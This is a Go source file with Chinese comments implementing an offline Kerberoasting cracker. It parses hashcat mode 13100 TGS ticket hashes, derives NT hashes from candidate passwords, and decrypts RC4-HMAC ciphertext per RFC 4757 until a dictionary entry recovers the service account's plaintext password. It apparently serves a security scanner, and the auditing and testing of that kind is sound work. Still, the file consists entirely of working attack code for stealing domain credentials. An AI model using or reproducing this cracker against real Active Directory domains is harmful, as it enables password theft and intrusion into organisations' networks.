// Package krbcrypt 实现 Kerberoasting 的离线破解原语：RC4-HMAC（etype 23，
// RFC 4757）的密文解析、NT hash 派生与字典穷举校验。
//
// Kerberoasting 战利品是 TGS-REP 里 ticket.enc-part 的密文——密钥就是服务
// 账号的 NT hash（MD4(UTF-16LE(口令))）。破解 = 对字典每个候选口令派生 NT
// hash，按 RFC 4757 流程解密并校验 checksum，命中即还原出口令。全程纯离线，
// 不再触碰域控——这正是 Kerberoasting 对攻击者友好、对防守者危险的原因。
//
// 加解密流程与 gokrb5/v8/crypto/rfc4757 逐行对齐（k1=key 本身不派生；
// k2=HMAC(k1, MS T-number)；k3=HMAC(k2, checksum)；校验=HMAC(k2, 全段明文)），
// 保证与本平台 Kerberos 栈互操作无偏差。
//
// 本包不依赖 jingwei 其余代码，可被 scanner 与独立工具共同复用。
package krbcrypt

import (
	"crypto/hmac"
	"crypto/md5"
	"crypto/subtle"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"regexp"
	"strings"
	"unicode/utf16"

	"golang.org/x/crypto/md4"
)

// rc4Cipher 是 RC4 的最小实现。x/crypto 新版本已移除 rc4 包（算法废弃），
// 但 Kerberos RC4-HMAC（etype 23）是既成协议事实——存量域里大量服务账号仍
// 以 RC4 出票，破解端必须能算它。实现为教科书标准 KSA+PRGA。
type rc4Cipher struct {
	s    [256]byte
	i, j uint8
}

func newRC4(key []byte) (*rc4Cipher, error) {
	if len(key) < 1 || len(key) > 256 {
		return nil, errors.New("rc4: 密钥长度须在 1..256 字节")
	}
	c := &rc4Cipher{}
	for i := 0; i < 256; i++ {
		c.s[i] = uint8(i)
	}
	var j uint8
	for i := 0; i < 256; i++ {
		j += c.s[i] + key[i%len(key)]
		c.s[i], c.s[j] = c.s[j], c.s[i]
	}
	return c, nil
}

func (c *rc4Cipher) XORKeyStream(dst, src []byte) {
	for k := range src {
		c.i++
		c.j += c.s[c.i]
		c.s[c.i], c.s[c.j] = c.s[c.j], c.s[c.i]
		dst[k] = src[k] ^ c.s[c.s[c.i]+c.s[c.j]]
	}
}

// KeyUsageTicket 是 ticket.enc-part 的 key usage（RFC 4120 §7.5.1）。
const KeyUsageTicket = 2

// krb5tgs23 匹配 hashcat mode 13100 的整行格式（两个星号包 user/realm/spn
// 三个 $ 分隔字段，随后 $ 接 checksum+cipher hex）：
// $krb5tgs$23$*user$realm$spn*$<hex>
var krb5tgs23 = regexp.MustCompile(`(?i)\$krb5tgs\$23\$\*[^*]*\*\$([0-9a-f]+)`)

// NTLMHash 返回口令的 NT hash：MD4(UTF-16LE(password))。Kerberos RC4 的
// 长期密钥就是它。
func NTLMHash(password string) []byte {
	u := utf16.Encode([]rune(password))
	utf16le := make([]byte, 0, len(u)*2)
	for _, v := range u {
		utf16le = binary.LittleEndian.AppendUint16(utf16le, v)
	}
	h := md4.New()
	h.Write(utf16le)
	return h.Sum(nil)
}

// msMsgType 把 Kerberos key usage 换算成 Microsoft T-number 的 LE4 字节
// （3→8、9→8、23→13，其余原样）。与 gokrb5 UsageToMSMsgType 一致。
func msMsgType(usage uint32) [4]byte {
	switch usage {
	case 3, 9:
		usage = 8
	case 23:
		usage = 13
	}
	var t [4]byte
	binary.LittleEndian.PutUint32(t[:], usage)
	return t
}

func hmacMD5(key, data []byte) []byte {
	m := hmac.New(md5.New, key)
	m.Write(data)
	return m.Sum(nil)
}

// parseCipherHex 接受两种输入：纯 hex 密文，或 hashcat 13100 整行。
func parseCipherHex(s string) ([]byte, error) {
	s = strings.TrimSpace(s)
	if m := krb5tgs23.FindStringSubmatch(s); m != nil {
		s = m[1]
	}
	b, err := hex.DecodeString(strings.ToLower(s))
	if err != nil {
		return nil, fmt.Errorf("TGS 密文不是合法 hex: %w", err)
	}
	if len(b) < 16+8 {
		return nil, fmt.Errorf("TGS 密文过短（%d 字节，至少需要 checksum16+conf8）", len(b))
	}
	return b, nil
}

// RFC4757Decrypt 按 RFC 4757 解密并校验 RC4-HMAC 密文：
//
//	k2 = HMAC-MD5(key, MS T-number(usage))
//	checksum = cipher[0:16]
//	k3 = HMAC-MD5(k2, checksum)
//	plain = RC4(k3, cipher[16:])
//	验证 HMAC-MD5(k2, plain) == checksum（plain 含前 8 字节 confounder）
//
// 返回明文（去 confounder 后）；校验不过返回 false。
func RFC4757Decrypt(key, cipher []byte, usage uint32) ([]byte, bool) {
	if len(cipher) < 16+8 || len(key) == 0 {
		return nil, false
	}
	t := msMsgType(usage)
	k2 := hmacMD5(key, t[:])
	checksum := cipher[:16]
	k3 := hmacMD5(k2, checksum)

	c, err := newRC4(k3)
	if err != nil {
		return nil, false
	}
	withConf := make([]byte, len(cipher)-16)
	c.XORKeyStream(withConf, cipher[16:])

	if subtle.ConstantTimeCompare(hmacMD5(k2, withConf), checksum) != 1 {
		return nil, false
	}
	return withConf[8:], true
}

// RFC4757Encrypt 是 Decrypt 的对偶（测试夹具与本地自证用）：产出
// checksum || RC4(k3, confounder||plaintext) 密文，confounder 由调用方给
// （固定值即可，破解不看具体值）。
func RFC4757Encrypt(key, plaintext []byte, usage uint32) ([]byte, error) {
	if len(key) != 16 {
		return nil, errors.New("RC4-HMAC 密钥必须 16 字节（NT hash）")
	}
	t := msMsgType(usage)
	k2 := hmacMD5(key, t[:])
	toenc := append([]byte{1, 2, 3, 4, 5, 6, 7, 8}, plaintext...) // 固定 confounder
	checksum := hmacMD5(k2, toenc)
	k3 := hmacMD5(k2, checksum)

	c, err := newRC4(k3)
	if err != nil {
		return nil, err
	}
	ed := make([]byte, len(toenc))
	c.XORKeyStream(ed, toenc)
	return append(append([]byte{}, checksum...), ed...), nil
}

// CrackKRB5TGS23 对字典逐口令派生 NT hash 并按 RFC 4757 校验密文。命中返回
// 对应口令。cipher 支持纯 hex 或 hashcat mode 13100 整行。usage 固定
// KeyUsageTicket（ticket.enc-part 由服务账号 key 加密）。
func CrackKRB5TGS23(cipherHex string, dict []string) (password string, ok bool, err error) {
	cipher, err := parseCipherHex(cipherHex)
	if err != nil {
		return "", false, err
	}
	seen := make(map[string]struct{}, len(dict))
	for _, cand := range dict {
		cand = strings.TrimSpace(cand)
		if cand == "" {
			continue
		}
		if _, dup := seen[cand]; dup {
			continue
		}
		seen[cand] = struct{}{}
		nt := NTLMHash(cand)
		if _, good := RFC4757Decrypt(nt, cipher, KeyUsageTicket); good {
			return cand, true, nil
		}
	}
	return "", false, nil
}
